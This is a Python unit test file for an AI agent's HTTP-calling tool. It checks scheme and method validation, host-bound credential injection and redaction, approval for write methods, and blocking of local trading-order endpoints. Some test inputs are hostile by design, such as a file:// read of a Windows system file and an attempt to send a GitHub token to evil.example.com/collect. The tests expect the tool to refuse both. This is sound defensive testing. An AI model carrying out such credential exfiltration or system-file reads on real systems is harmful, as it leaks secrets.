"""
tools/http_tools.py 單元測試 (不連網，mock 底層送出函式 _send)

重點：
    - 只接受 http / https 與常見 HTTP 方法；GET / HEAD 直接執行，其他方法需使用者同意
    - 金鑰只能用 .env 綁定過的名稱與主機注入 Header；不進 URL、不得自帶、結果遮蔽
    - ArQ 自身的核心金鑰 (Discord / Gemini / Anthropic) 一律不可注入
    - 本機 Shioaji HTTP 伺服器的下單 / 改單 / 刪單端點一律拒絕 (唯讀)
    - 不跟隨重新導向 (避免金鑰 Header 被帶到其他主機)
"""

import json
import os
import sys
import unittest
from unittest.mock import patch

PROJECT_ROOT = os.path.abspath(os.path.join(os.path.dirname(__file__), ".."))
if PROJECT_ROOT not in sys.path:
    sys.path.insert(0, PROJECT_ROOT)

from tests import netguard  # noqa: E402,F401  測試禁止連外

from tools import http_tools as ht  # noqa: E402

FAKE_TOKEN = "ghp_FAKE0000111122223333444455556666"


def _resp(status=200, body=b"", content_type="application/json", headers=None):
    h = {"Content-Type": content_type}
    h.update(headers or {})
    return status, h, body


class SendRecorder:
    """取代 http_tools._send：記錄送出的 Request，回傳預設回應"""

    def __init__(self, response):
        self.response = response
        self.requests = []

    def __call__(self, req, timeout):
        self.requests.append(req)
        return self.response


class TestValidation(unittest.TestCase):
    def test_rejects_non_http_scheme(self):
        with patch.object(ht, "_send") as send:
            res = ht.call_api("file:///C:/Windows/win.ini")
        self.assertFalse(res["success"])
        send.assert_not_called()

    def test_rejects_unknown_method(self):
        with patch.object(ht, "_send") as send:
            res = ht.call_api("https://example.com", method="TRACE")
        self.assertFalse(res["success"])
        send.assert_not_called()

    def test_rejects_invalid_json_body(self):
        with patch.object(ht, "_send") as send:
            res = ht.call_api("https://example.com", method="POST", json_body="{not json")
        self.assertFalse(res["success"])
        send.assert_not_called()

    def test_rejects_auth_headers_from_model(self):
        with patch.object(ht, "_send") as send:
            res = ht.call_api("https://example.com", headers='{"Authorization": "Bearer abc"}')
        self.assertFalse(res["success"])
        send.assert_not_called()

    def test_blocks_local_trading_endpoints(self):
        urls = [
            "http://127.0.0.1:8080/api/v1/order/place_order",
            "http://localhost:8080/api/v1/order/update_price",
            "http://127.0.0.1:8080/api/v1/order/cancel_order",
            "http://[::1]:8080/api/v1/order/update_order",
        ]
        for url in urls:
            with self.subTest(url=url), patch.object(ht, "_send") as send:
                res = ht.call_api(url, method="POST")
                self.assertFalse(res["success"])
                send.assert_not_called()

    def test_allows_local_readonly_query(self):
        rec = SendRecorder(_resp(body=b'{"acc_balance": 1000}'))
        with patch.object(ht, "_send", rec):
            res = ht.call_api("http://127.0.0.1:8080/api/v1/account/balance")
        self.assertTrue(res["success"])
        self.assertEqual(res["data"], {"acc_balance": 1000})


class TestRequestAndResponse(unittest.TestCase):
    def test_get_json(self):
        rec = SendRecorder(_resp(body=json.dumps({"rate": 32.1}).encode()))
        with patch.object(ht, "_send", rec):
            res = ht.call_api("https://api.example.com/rate", query='{"base": "USD"}')
        self.assertTrue(res["success"])
        self.assertEqual(res["status"], 200)
        self.assertEqual(res["data"], {"rate": 32.1})
        req = rec.requests[0]
        self.assertEqual(req.get_method(), "GET")
        self.assertEqual(req.full_url, "https://api.example.com/rate?base=USD")

    def test_post_sends_json_body(self):
        rec = SendRecorder(_resp(status=201, body=b'{"id": 1}'))
        with patch.object(ht, "_send", rec):
            res = ht.call_api("https://api.example.com/items", method="post", json_body='{"name": "x"}')
        self.assertTrue(res["success"])
        req = rec.requests[0]
        self.assertEqual(req.get_method(), "POST")
        self.assertEqual(json.loads(req.data), {"name": "x"})
        self.assertEqual(req.get_header("Content-type"), "application/json")

    def test_text_response_is_truncated(self):
        rec = SendRecorder(_resp(body=("a" * (ht.MAX_TEXT_CHARS + 500)).encode(), content_type="text/plain"))
        with patch.object(ht, "_send", rec):
            res = ht.call_api("https://example.com/big")
        self.assertTrue(res["success"])
        self.assertTrue(res["truncated"])
        self.assertLessEqual(len(res["text"]), ht.MAX_TEXT_CHARS)

    def test_http_error_status(self):
        rec = SendRecorder(_resp(status=404, body=b'{"error": "not found"}'))
        with patch.object(ht, "_send", rec):
            res = ht.call_api("https://example.com/missing")
        self.assertFalse(res["success"])
        self.assertEqual(res["status"], 404)
        self.assertEqual(res["data"], {"error": "not found"})

    def test_redirect_not_followed(self):
        rec = SendRecorder(_resp(status=302, body=b"", content_type="text/html",
                                 headers={"Location": "https://other.example.com/"}))
        with patch.object(ht, "_send", rec):
            res = ht.call_api("https://example.com/old")
        self.assertEqual(res["status"], 302)
        self.assertEqual(res["location"], "https://other.example.com/")
        self.assertEqual(len(rec.requests), 1)

    def test_network_error_is_reported(self):
        def boom(req, timeout):
            raise OSError("connection refused")
        with patch.object(ht, "_send", boom):
            res = ht.call_api("http://127.0.0.1:9/unreachable")
        self.assertFalse(res["success"])
        self.assertIn("connection refused", res["error"])


class TestCredentials(unittest.TestCase):
    def _env(self, bindings, **extra):
        env = {"HTTP_API_CREDENTIALS": bindings, "GITHUB_TOKEN": FAKE_TOKEN}
        env.update(extra)
        return patch.dict(os.environ, env)

    def test_unbound_credential_rejected(self):
        with self._env(""), patch.object(ht, "_send") as send:
            res = ht.call_api("https://api.github.com/user", credential="GITHUB_TOKEN")
        self.assertFalse(res["success"])
        send.assert_not_called()

    def test_host_mismatch_rejected(self):
        with self._env("GITHUB_TOKEN@api.github.com"), patch.object(ht, "_send") as send:
            res = ht.call_api("https://evil.example.com/collect", credential="GITHUB_TOKEN")
        self.assertFalse(res["success"])
        send.assert_not_called()

    def test_credential_requires_https(self):
        with self._env("GITHUB_TOKEN@api.github.com"), patch.object(ht, "_send") as send:
            res = ht.call_api("http://api.github.com/user", credential="GITHUB_TOKEN")
        self.assertFalse(res["success"])
        send.assert_not_called()

    def test_core_secret_never_injected(self):
        with self._env("GEMINI_API_KEY@generativelanguage.googleapis.com",
                       GEMINI_API_KEY="fake-gemini-key-for-test"), \
                patch.object(ht, "_send") as send:
            res = ht.call_api("https://generativelanguage.googleapis.com/v1/models", credential="GEMINI_API_KEY")
        self.assertFalse(res["success"])
        send.assert_not_called()

    def test_bearer_header_injected_and_redacted(self):
        echo = json.dumps({"you_sent": FAKE_TOKEN}).encode()
        rec = SendRecorder(_resp(body=echo))
        with self._env("GITHUB_TOKEN@api.github.com"), patch.object(ht, "_send", rec):
            res = ht.call_api("https://api.github.com/user", credential="GITHUB_TOKEN")
        self.assertTrue(res["success"])
        req = rec.requests[0]
        self.assertEqual(req.get_header("Authorization"), f"Bearer {FAKE_TOKEN}")
        self.assertNotIn(FAKE_TOKEN, req.full_url)
        self.assertNotIn(FAKE_TOKEN, json.dumps(res, ensure_ascii=False))

    def test_custom_header_name(self):
        rec = SendRecorder(_resp(body=b"{}"))
        with self._env("WX_API_KEY@api.wx.example.com#X-API-Key", WX_API_KEY="wxkey-FAKE-123456789"), \
                patch.object(ht, "_send", rec):
            res = ht.call_api("https://api.wx.example.com/now", credential="WX_API_KEY")
        self.assertTrue(res["success"])
        self.assertEqual(rec.requests[0].get_header("X-api-key"), "wxkey-FAKE-123456789")

    def test_missing_env_value_rejected(self):
        with patch.dict(os.environ, {"HTTP_API_CREDENTIALS": "EMPTY_TOKEN@api.example.com"}), \
                patch.object(ht, "_send") as send:
            os.environ.pop("EMPTY_TOKEN", None)
            res = ht.call_api("https://api.example.com/x", credential="EMPTY_TOKEN")
        self.assertFalse(res["success"])
        send.assert_not_called()


class TestRisk(unittest.TestCase):
    def test_read_methods_have_no_risk(self):
        self.assertIsNone(ht.call_api_risk({"url": "https://x", "method": "GET"}))
        self.assertIsNone(ht.call_api_risk({"url": "https://x"}))
        self.assertIsNone(ht.call_api_risk({"url": "https://x", "method": "head"}))

    def test_write_methods_need_approval(self):
        for m in ("POST", "put", "PATCH", "DELETE"):
            with self.subTest(method=m):
                self.assertIsNotNone(ht.call_api_risk({"url": "https://x", "method": m}))

    def test_registered_in_agent(self):
        import agent
        self.assertIn("call_api", agent.TOOL_REGISTRY)
        self.assertIs(agent.TOOL_REGISTRY["call_api"].risk, ht.call_api_risk)
        text = agent.describe_tool_call("call_api", {"url": "https://x/y", "method": "POST", "json_body": '{"a": 1}'})
        self.assertIn("POST", text)
        self.assertIn("https://x/y", text)


if __name__ == "__main__":
    unittest.main()
